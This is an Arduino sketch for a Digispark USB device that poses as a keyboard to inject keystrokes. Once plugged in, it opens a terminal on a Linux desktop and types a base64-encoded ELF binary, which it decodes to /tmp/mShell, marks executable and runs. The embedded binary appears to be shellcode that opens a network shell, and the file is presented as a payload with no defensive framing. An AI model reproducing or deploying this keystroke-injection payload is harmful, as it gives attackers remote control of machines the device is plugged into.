#include "DigiKeyboard.h"

void setup() {

// LED on.
pinMode(1, OUTPUT);
delay(200);
// Super, delete content
// Start to inject payload, turn the LED on
digitalWrite(1, HIGH);
DigiKeyboard.sendKeyStroke(KEY_DELETE); // Clean
delay(200);

DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT); // Super key, open 'search'
delay(300);

DigiKeyboard.print("terminal"); // Program to run
delay(500);

DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
// Delay for 1 second, if terminal is not opened, part of the string below is wasted to /dev/null
delay(1000);

// Send our payload
DigiKeyboard.print("echo");
DigiKeyboard.sendKeyStroke(KEY_SPACE);
DigiKeyboard.print("f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAibAAAA4gAAAAcAAAAAEAAAMdv341NDU2oCsGaJ4c2Al1toCgAACGgCAANwieFqZlhQUVeJ4UPNgLIHuQAQAACJ48HrDMHjDLB9zYBbieGZtgywA82A/+E= | base64 --decode &gt; /tmp/mShell");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
delay(500);

// Change the permissions for the file...
DigiKeyboard.println("chmod 755 /tmp/mShell");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
delay(200);
// ...and execute it
DigiKeyboard.println("/tmp/mShell");
DigiKeyboard.sendKeyStroke(KEY_ENTER);

delay(100);
// Payload executed!
digitalWrite(1, LOW);

}

void loop() {
// When scripts are done, blink some LED like it's 19

digitalWrite(1, HIGH);
delay(200);

digitalWrite(1, LOW);
delay(300);

}
